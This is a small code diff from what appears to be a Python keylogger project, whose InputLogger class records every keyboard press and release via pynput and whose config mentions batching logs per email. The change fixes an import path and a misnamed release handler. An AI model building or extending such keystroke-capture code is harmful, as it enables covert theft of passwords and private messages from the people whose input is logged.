@@ -3,7 +3,7 @@ from pynput.mouse import Listener as MouseListener, Button
 import os
 
 from config.config import LOGS_PER_EMAIL
-from utils.logging_utils import log_data, log_error
+from core.utils.logging_utils import log_data, log_error
 
 
 class InputLogger:
@@ -16,7 +16,7 @@ class InputLogger:
         log_data(self.log_file, f"KEYBOARD PRESSED {str(key)}")
         return self.running
 
-    def on_keyboard_press(self, key):
+    def on_keyboard_release(self, key):
         log_data(self.log_file, f"KEYBOARD RELEASED {str(key)}")
         return self.running
 
